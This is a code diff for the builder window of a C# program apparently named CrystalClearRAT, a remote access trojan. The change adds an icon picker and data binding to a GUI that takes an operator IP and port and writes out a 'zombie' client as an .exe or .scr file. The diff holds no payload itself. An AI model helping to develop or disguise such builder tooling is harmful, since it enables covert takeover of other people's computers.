@@ -4,7 +4,9 @@ using MahApps.Metro.Controls;
 using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
+using System.ComponentModel;
 using System.Linq;
+using System.Runtime.CompilerServices;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows;
@@ -21,16 +23,20 @@ namespace CrystalClearRAT.Windows
     /// <summary>
     /// Logika interakcji dla klasy BuilderWindow.xaml
     /// </summary>
-    public partial class BuilderWindow : MetroWindow
+    public partial class BuilderWindow : MetroWindow, INotifyPropertyChanged
     {
+
+        public string FilePath { get; private set; } = "No icon.";
         public BuilderWindow()
         {
+            DataContext = this;
             InitializeComponent();
+           
         }
 
+        public event PropertyChangedEventHandler PropertyChanged;
 
-
-        private void Button_Click(object sender, RoutedEventArgs e)
+        private void BuildButton_Click(object sender, RoutedEventArgs e)
         {
             string errorMsg = "";
 
@@ -53,11 +59,25 @@ namespace CrystalClearRAT.Windows
             {
                 Filter = "Executable (.exe)|*.exe|Screensaver (.scr)|*.scr"
             };
-           // dialog.Filter = "Exe Files (.exe)|*.exe;
+            // dialog.Filter = "Exe Files (.exe)|*.exe;
             if (dialog.ShowDialog() == true)
             {
                 ZombieBuilder.Build(new ClientSettings(ipTextBox.Text, int.Parse(portTextBox.Text)), dialog.FileName);
             }
+        }
+
+        private void selectIconButton_Click(object sender, RoutedEventArgs e)
+        {
+            OpenFileDialog dialog = new OpenFileDialog()
+            {
+                Filter = "Icons (.ico)|*.ico"
+            };
+
+            if (dialog.ShowDialog() == true)
+            {
+                FilePath = dialog.FileName;
+            }
+
         }
     }
 }
